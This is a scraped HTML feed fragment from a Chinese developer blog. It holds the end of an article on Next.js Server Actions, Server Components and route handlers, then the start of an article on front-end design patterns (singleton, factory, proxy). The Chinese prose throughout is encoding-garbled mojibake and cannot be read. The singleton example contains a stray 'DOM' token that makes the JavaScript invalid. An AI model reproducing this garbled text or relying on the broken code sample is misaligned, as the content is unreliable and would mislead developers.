    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data)
  })
  <span class="hljs-keyword">return</span> result.<span class="hljs-title function_">json</span>()
}
</code></pre>
<p><strong>ä½ äººå·²ç»åœ¨æœåŠ¡ç«¯äº†ï¼Œä¸ºä»€ä¹ˆè¿˜è¦ç»• HTTP ä¸€åœˆï¼Ÿ</strong></p>
<p>è¿™ä¹ˆå¹²çš„åæœï¼š</p>
<ul>
<li>å¤šä¸€è·³ç½‘ç»œè¯·æ±‚ï¼ˆæ›´å®¹æ˜“ç€‘å¸ƒï¼‰</li>
<li>å¤šä¸€æ¬¡åºåˆ—åŒ–/ååºåˆ—åŒ–</li>
<li>å¤šä¸€å±‚é”™è¯¯å¤„ç†</li>
</ul>
<p><strong>æ­£ç¡®å§¿åŠ¿ï¼šç›´æ¥è°ƒä¸šåŠ¡é€»è¾‘</strong></p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// âœ… server/order.service.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createOrder</span>(<span class="hljs-params">data, userId</span>) {
  <span class="hljs-comment">// æ ¡éªŒã€å†™åº“ã€è§¦å‘é€šçŸ¥...</span>
  <span class="hljs-keyword">return</span> db.<span class="hljs-property">order</span>.<span class="hljs-title function_">create</span>({ <span class="hljs-attr">data</span>: { ...data, userId } })
}

<span class="hljs-comment">// âœ… app/orders/actions.ts</span>
<span class="hljs-string">'use server'</span>
<span class="hljs-keyword">import</span> { createOrder } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/server/order.service'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createOrderAction</span>(<span class="hljs-params">formData</span>) {
  <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getCurrentUser</span>()
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">createOrder</span>(<span class="hljs-title function_">parseFormData</span>(formData), user.<span class="hljs-property">id</span>)
}
</code></pre>
<p><strong>ä»€ä¹ˆæ—¶å€™æ‰è¯¥ç”¨ /apiï¼Ÿ</strong></p>
<ul>
<li>å¤–éƒ¨ç³»ç»Ÿè¦è°ƒï¼ˆwebhookã€ç§»åŠ¨ç«¯ï¼‰</li>
<li>éœ€è¦è‡ªå®šä¹‰ Responseï¼ˆä¸‹è½½æ–‡ä»¶ã€streamingï¼‰</li>
<li>éœ€è¦æ ‡å‡† HTTP è¯­ä¹‰ï¼ˆçŠ¶æ€ç ã€ç‰¹æ®Š headerï¼‰</li>
</ul>
<p><strong>å†…éƒ¨å†™æ“ä½œï¼Ÿç›´æ¥ Action è°ƒ Serviceï¼Œåˆ«ç»•ã€‚</strong></p>
<h2 data-id="heading-8">é€ŸæŸ¥è¡¨ï¼šä¸€å¼ å›¾çœ‹å®Œæ€ä¹ˆé€‰</h2>






























<table><thead><tr><th>åœºæ™¯</th><th>ç”¨ä»€ä¹ˆ</th><th>æ ¸å¿ƒåŸåˆ™</th></tr></thead><tbody><tr><td>æ‰“å¼€é¡µé¢è¦æ•°æ®</td><td><strong>RSC</strong> (Server Component)</td><td>å¹¶è¡Œæ‹¿æ•°æ®ï¼Œåˆ«ä¸²è¡Œç­‰</td></tr><tr><td>é¡µé¢å†…å†™æ•°æ®</td><td><strong>Server Action</strong></td><td>åˆ«æ‹‰é•¿ç­‰å¾…é“¾ï¼Œåˆ«æ¨å®¢æˆ·ç«¯</td></tr><tr><td>å¤–éƒ¨ç³»ç»Ÿå›è°ƒ</td><td><strong>Route Handler</strong> (/api)</td><td>å¯¹å¤–è¾¹ç•Œï¼Œå†…éƒ¨é€»è¾‘ç…§æ ·ç ç€‘å¸ƒ</td></tr><tr><td>äº¤äº’éœ€è¦çŠ¶æ€</td><td><strong>Client Component</strong></td><td>åªæ”¾å¿…é¡»çš„ï¼Œåˆ«å•¥éƒ½å¡å®¢æˆ·ç«¯</td></tr></tbody></table>
<p><strong>æ‹¿ä¸å‡†ï¼Ÿå›åˆ°ä¸¤å¥è¯ï¼š</strong></p>
<ol>
<li>ä¼šä¸ä¼šå¤šç­‰ 600msï¼Ÿï¼ˆç€‘å¸ƒï¼‰</li>
<li>ä¼šä¸ä¼šå¤šèƒŒ 300KBï¼Ÿï¼ˆåŒ…ä½“ç¨ï¼‰</li>
</ol>
<h2 data-id="heading-9">å®æˆ˜ç›®å½•é•¿è¿™æ ·</h2>
<pre><code class="hljs language-bash" lang="bash">app/
â”œâ”€â”€ products/
â”‚   â”œâ”€â”€ page.tsx           <span class="hljs-comment"># RSCï¼šå¹¶è¡Œæ‹¿æ•°æ®æ¸²æŸ“</span>
â”‚   â”œâ”€â”€ [<span class="hljs-built_in">id</span>]/page.tsx      <span class="hljs-comment"># RSCï¼šè¯¦æƒ…é¡µ</span>
â”‚   â””â”€â”€ actions.ts         <span class="hljs-comment"># Server Actionsï¼šå†™æ“ä½œ</span>
â”‚
â”œâ”€â”€ api/
â”‚   â””â”€â”€ webhooks/
â”‚       â””â”€â”€ stripe/
â”‚           â””â”€â”€ route.ts   <span class="hljs-comment"># Route Handlerï¼šå¤–éƒ¨å›è°ƒ</span>
â”‚
server/                    <span class="hljs-comment"># ä¸šåŠ¡é€»è¾‘å±‚ï¼ˆAction å’Œ API éƒ½è°ƒè¿™é‡Œï¼‰</span>
â”œâ”€â”€ product.service.ts     <span class="hljs-comment"># ç»„åˆé€»è¾‘ã€æƒé™ã€äº‹åŠ¡</span>
â””â”€â”€ product.repo.ts        <span class="hljs-comment"># çº¯æ•°æ®è®¿é—®ï¼ˆDB/å¤–éƒ¨ APIï¼‰</span>

components/                <span class="hljs-comment"># UI ç»„ä»¶</span>
â”œâ”€â”€ ProductCard.tsx        <span class="hljs-comment"># Server Componentï¼ˆé»˜è®¤ï¼‰</span>
â””â”€â”€ AddToCartButton.tsx    <span class="hljs-comment"># Client Componentï¼ˆ"use client"ï¼‰</span>
</code></pre>
<p><strong>æ ¸å¿ƒæ€è·¯ï¼š</strong></p>
<ul>
<li><strong>app/</strong> è´Ÿè´£è·¯ç”±å’Œ UI ç»„åˆ</li>
<li><strong>server/</strong> è´Ÿè´£ä¸šåŠ¡é€»è¾‘ï¼ˆå¯å¤ç”¨ï¼‰</li>
<li><strong>components/</strong> è´Ÿè´£å±•ç¤ºå’Œäº¤äº’</li>
</ul>
<p>Action å’Œ Route Handler éƒ½ä¸å†™ä¸šåŠ¡ç»†èŠ‚ï¼Œéƒ½è°ƒ <code>server/</code> é‡Œçš„å‡½æ•°ã€‚è¿™æ ·ï¼š</p>
<ul>
<li>é€»è¾‘ä¸é‡å¤</li>
<li>æµ‹è¯•æ›´å¥½å†™</li>
<li>é‡æ„ä¸ä¼¤ç­‹åŠ¨éª¨</li>
</ul>
<h2 data-id="heading-10">æœ€å</h2>
<p>æ¶æ„ä¸æ˜¯"æˆ‘ç”¨äº†å¤šå°‘é«˜çº§åè¯"ï¼Œæ˜¯**"æˆ‘è®©ç”¨æˆ·å°‘ç­‰äº†å¤šå°‘æ—¶é—´"**ã€‚</p>
<p>å…ˆç  600ms çš„ç€‘å¸ƒï¼Œå†ç  300KB çš„åŒ…ä½“ç¨ã€‚å‰©ä¸‹çš„ useMemoã€memoã€è™šæ‹Ÿæ»šåŠ¨â€”â€”ç­‰ä½ æŠŠè¿™ä¸¤åº§å¤§å±±ç§»å¹³äº†å†è¯´ã€‚</p>
<p><strong>è®°ä½ï¼šèƒ½å¹¶è¡Œå°±å¹¶è¡Œï¼Œèƒ½æœåŠ¡ç«¯å°±æœåŠ¡ç«¯ã€‚</strong></p>
<p>åˆ«ç­‰é¡µé¢æ…¢å¾—ç”¨æˆ·éª‚å¨˜äº†ï¼Œæ‰æƒ³èµ·æ¥"å“¦å¯¹ï¼Œæˆ‘å¥½åƒå†™äº†ä¸ªç€‘å¸ƒ"ã€‚</p>
<p>å‚è€ƒï¼š</p>
<ol>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fraw.githubusercontent.com%2Fvercel-labs%2Fweb-interface-guidelines%2Fmain%2Fcommand.md" target="_blank" title="https://raw.githubusercontent.com/vercel-labs/web-interface-guidelines/main/command.md" ref="nofollow noopener noreferrer">raw.githubusercontent.com/vercel-labsâ€¦</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvercel-labs%2Fagent-skills%2Fblob%2Fmain%2Fskills%2Freact-best-practices%2FSKILL.md" target="_blank" title="https://github.com/vercel-labs/agent-skills/blob/main/skills/react-best-practices/SKILL.md" ref="nofollow noopener noreferrer">github.com/vercel-labsâ€¦</a></li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æµ…æµ…çœ‹ä¸€ä¸‹è®¾è®¡æ¨¡å¼]]></title>    <link>https://juejin.cn/post/7604507125857435675</link>    <guid>https://juejin.cn/post/7604507125857435675</guid>    <pubDate>2026-02-09T08:45:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604507125857435675" data-draft-id="7604142616474648582" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æµ…æµ…çœ‹ä¸€ä¸‹è®¾è®¡æ¨¡å¼"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-02-09T08:45:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ccnocare"/> <meta itemprop="url" content="https://juejin.cn/user/1704658072243594"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æµ…æµ…çœ‹ä¸€ä¸‹è®¾è®¡æ¨¡å¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1704658072243594/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ccnocare
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T08:45:20.000Z" title="Mon Feb 09 2026 08:45:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰ç«¯å¼€å‘ä¸­å¸¸ç”¨çš„è®¾è®¡æ¨¡å¼ä¸»è¦åˆ†ä¸ºåˆ›å»ºå‹ã€ç»“æ„å‹å’Œè¡Œä¸ºå‹ä¸‰ç±»ï¼Œä¸‹é¢æ˜¯é’ˆå¯¹å‰ç«¯é«˜é¢‘ä½¿ç”¨çš„æ¨¡å¼ï¼Œé€ä¸€è®²è§£å…¶æ¦‚å¿µã€ä½¿ç”¨åœºæ™¯å¹¶æä¾›å¯ç›´æ¥è¿è¡Œçš„ Demoã€‚</h2>
<h2 data-id="heading-1">ä¸€ã€åˆ›å»ºå‹æ¨¡å¼</h2>
<p>è¿™ç±»æ¨¡å¼ä¸»è¦è§£å†³ã€Œå¯¹è±¡åˆ›å»ºã€ç›¸å…³çš„é—®é¢˜ï¼Œè®©å¯¹è±¡åˆ›å»ºæ›´çµæ´»ã€æ›´å¯æ§ã€‚</p>
<h3 data-id="heading-2">1. å•ä¾‹æ¨¡å¼ (Singleton)</h3>
<p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>ï¼šä¿è¯ä¸€ä¸ªç±»ä»…æœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶æä¾›ä¸€ä¸ªå…¨å±€è®¿é—®ç‚¹ã€‚
<strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>å…¨å±€ç¼“å­˜å¯¹è±¡ - å¼¹çª—/æ¨¡æ€æ¡†ç»„ä»¶ï¼ˆç¡®ä¿é¡µé¢ä¸­åªæœ‰ä¸€ä¸ªå®ä¾‹ï¼‰</li>
<li>Vuex/Pinia çš„ store å®ä¾‹ - å…¨å±€äº‹ä»¶æ€»çº¿
<strong>Demo ä»£ç </strong>ï¼š</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å•ä¾‹æ¨¡å¼å®ç°ï¼ˆé€šç”¨ç‰ˆï¼‰ </span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SingletonModal</span> { 
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">content</span>) { 
        <span class="hljs-comment">// å¦‚æœå·²æœ‰å®ä¾‹ï¼Œç›´æ¥è¿”å› </span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">SingletonModal</span>.<span class="hljs-property">instance</span>) { 
            <span class="hljs-keyword">return</span> <span class="hljs-title class_">SingletonModal</span>.<span class="hljs-property">instance</span>; 
        } 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">content</span> = content; 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span> = <span class="hljs-literal">null</span>; 
        <span class="hljs-comment">// ç¼“å­˜å®ä¾‹ </span>
        <span class="hljs-title class_">SingletonModal</span>.<span class="hljs-property">instance</span> = <span class="hljs-variable language_">this</span>; 
    } 
    <span class="hljs-comment">// åˆ›å»ºå¼¹çª— </span>
    <span class="hljs-variable constant_">DOM</span> <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) { 
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>) 
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>; 

        <span class="hljs-keyword">const</span> modal = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>); 
        modal.<span class="hljs-property">style</span>.<span class="hljs-property">cssText</span> = <span class="hljs-string">`
            position: fixed; 
            top: 50%; 
            left: 50%; 
            transform: translate(-50%, -50%); 
            padding: 20px; 
            background: white; 
            border: 1px solid #ccc; 
            z-index: 9999; 
        `</span>; 
        modal.<span class="hljs-property">textContent</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">content</span>; 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span> = modal; 
        <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(modal); 
        <span class="hljs-keyword">return</span> modal; 
    } 
    <span class="hljs-comment">// å…³é—­å¼¹çª— </span>
    <span class="hljs-title function_">close</span>(<span class="hljs-params"/>) { 
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>) { 
            <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>); 
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span> = <span class="hljs-literal">null</span>; 
        } 
    } 
} 
<span class="hljs-comment">// æµ‹è¯•ï¼šå¤šæ¬¡åˆ›å»ºåªä¼šå¾—åˆ°åŒä¸€ä¸ªå®ä¾‹ </span>
<span class="hljs-keyword">const</span> modal1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SingletonModal</span>(<span class="hljs-string">'è¿™æ˜¯ç¬¬ä¸€ä¸ªå¼¹çª—'</span>); 
<span class="hljs-keyword">const</span> modal2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SingletonModal</span>(<span class="hljs-string">'è¿™æ˜¯ç¬¬äºŒä¸ªå¼¹çª—'</span>); 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(modal1 === modal2); <span class="hljs-comment">// trueï¼ˆéªŒè¯å•ä¾‹ï¼‰ </span>
modal1.<span class="hljs-title function_">render</span>(); <span class="hljs-comment">// æ¸²æŸ“å¼¹çª—ï¼ˆå†…å®¹æ˜¯"è¿™æ˜¯ç¬¬ä¸€ä¸ªå¼¹çª—"ï¼Œå› ä¸ºå®ä¾‹å¤ç”¨ï¼‰ </span>
<span class="hljs-comment">// modal1.close(); // å…³é—­å¼¹çª— </span>
</code></pre>
<h3 data-id="heading-3">2. å·¥å‚æ¨¡å¼ (Factory)</h3>
<p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>ï¼šå®šä¹‰ä¸€ä¸ªåˆ›å»ºå¯¹è±¡çš„æ¥å£ï¼Œè®©å­ç±»å†³å®šå®ä¾‹åŒ–å“ªä¸€ä¸ªç±»ï¼Œå°†å¯¹è±¡åˆ›å»ºçš„é€»è¾‘å°è£…èµ·æ¥ã€‚
<strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>æ ¹æ®ä¸åŒå‚æ•°åˆ›å»ºä¸åŒç±»å‹çš„ç»„ä»¶ï¼ˆå¦‚æŒ‰é’®ã€è¾“å…¥æ¡†ï¼‰</li>
<li>æ•°æ®æ ¼å¼åŒ–å·¥å…·ï¼ˆæ ¹æ®æ•°æ®ç±»å‹è¿”å›ä¸åŒæ ¼å¼ï¼‰</li>
<li>ç½‘ç»œè¯·æ±‚é€‚é…å™¨ï¼ˆæ ¹æ®ç¯å¢ƒé€‰æ‹© Axios/fetchï¼‰</li>
</ul>
<p><strong>Demo ä»£ç </strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å®šä¹‰ä¸åŒç±»å‹çš„ç»„ä»¶ç±» </span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Button</span> { 
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">text</span>) { 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">text</span> = text; 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = <span class="hljs-string">'button'</span>; 
    } 
    <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) { 
        <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;button&gt;<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.text}</span>&lt;/button&gt;`</span>; 
    } 
} 
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Input</span> { 
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">placeholder</span>) { 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">placeholder</span> = placeholder; 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = <span class="hljs-string">'input'</span>; 
    } 
    <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) { 
        <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;input type="text" placeholder="<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.placeholder}</span>"&gt;`</span>; 
    } 
} 
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Select</span> { 
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options</span>) { 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> = options; 
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = <span class="hljs-string">'select'</span>; 
    } 
    <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) { 
        <span class="hljs-keyword">const</span> optionsHtml = <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">opt</span> =&gt;</span> <span class="hljs-string">`&lt;option value="<span class="hljs-subst">${opt.value}</span>"&gt;<span class="hljs-subst">${opt.label}</span>&lt;/option&gt;`</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>); 
        <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;select&gt;<span class="hljs-subst">${optionsHtml}</span>&lt;/select&gt;`</span>; 
    } 
} 
<span class="hljs-comment">// ç»„ä»¶å·¥å‚ç±» </span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ComponentFactory</span> { 
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">createComponent</span>(<span class="hljs-params">type, config</span>) { 
        <span class="hljs-keyword">switch</span> (type) { 
            <span class="hljs-keyword">case</span> <span class="hljs-string">'button'</span>: 
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(config.<span class="hljs-property">text</span>); 
            <span class="hljs-keyword">case</span> <span class="hljs-string">'input'</span>: 
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Input</span>(config.<span class="hljs-property">placeholder</span>); 
            <span class="hljs-keyword">case</span> <span class="hljs-string">'select'</span>: 
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Select</span>(config.<span class="hljs-property">options</span>); 
            <span class="hljs-attr">default</span>: 
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`ä¸æ”¯æŒçš„ç»„ä»¶ç±»å‹ï¼š<span class="hljs-subst">${type}</span>`</span>); 
        } 
    } 
} 
<span class="hljs-comment">// æµ‹è¯•ï¼šé€šè¿‡å·¥å‚åˆ›å»ºä¸åŒç»„ä»¶ </span>
<span class="hljs-keyword">const</span> button = <span class="hljs-title class_">ComponentFactory</span>.<span class="hljs-title function_">createComponent</span>(<span class="hljs-string">'button'</span>, { <span class="hljs-attr">text</span>: <span class="hljs-string">'æäº¤'</span> }); 
<span class="hljs-keyword">const</span> input = <span class="hljs-title class_">ComponentFactory</span>.<span class="hljs-title function_">createComponent</span>(<span class="hljs-string">'input'</span>, { <span class="hljs-attr">placeholder</span>: <span class="hljs-string">'è¯·è¾“å…¥å§“å'</span> }); 
<span class="hljs-keyword">const</span> select = <span class="hljs-title class_">ComponentFactory</span>.<span class="hljs-title function_">createComponent</span>(<span class="hljs-string">'select'</span>, { <span class="hljs-attr">options</span>: [{ <span class="hljs-attr">label</span>: <span class="hljs-string">'ç”·'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'male'</span> }, { <span class="hljs-attr">label</span>: <span class="hljs-string">'å¥³'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'female'</span> }] }); 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(button.<span class="hljs-title function_">render</span>()); <span class="hljs-comment">// &lt;button&gt;æäº¤&lt;/button&gt; </span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(input.<span class="hljs-title function_">render</span>()); <span class="hljs-comment">// &lt;input type="text" placeholder="è¯·è¾“å…¥å§“å"&gt;</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(select.<span class="hljs-title function_">render</span>()); <span class="hljs-comment">// &lt;select&gt;&lt;option value="male"&gt;ç”·&lt;/option&gt;&lt;option value="female"&gt;å¥³&lt;/option&gt;&lt;/select&gt; </span>
</code></pre>
<hr/>
<h2 data-id="heading-4">äºŒã€ç»“æ„å‹æ¨¡å¼</h2>
<p>è¿™ç±»æ¨¡å¼å…³æ³¨å¯¹è±¡çš„ç»„åˆï¼Œä¼˜åŒ–ç±»æˆ–å¯¹è±¡çš„ç»“æ„ï¼Œæé«˜ä»£ç çš„å¤ç”¨æ€§å’Œçµæ´»æ€§ã€‚</p>
<h3 data-id="heading-5">1. ä»£ç†æ¨¡å¼ (Proxy)</h3>
<p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>ï¼šä¸ºå¦ä¸€ä¸ªå¯¹è±¡æä¾›ä¸€ä¸ªæ›¿èº«æˆ–å ä½ç¬¦ï¼Œä»¥æ§åˆ¶å¯¹è¿™ä¸ªå¯¹è±¡çš„è®¿é—®ã€‚
<strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>å›¾ç‰‡æ‡’åŠ è½½ï¼ˆä»£ç†æ§åˆ¶å›¾ç‰‡åŠ è½½æ—¶æœºï¼‰</li>
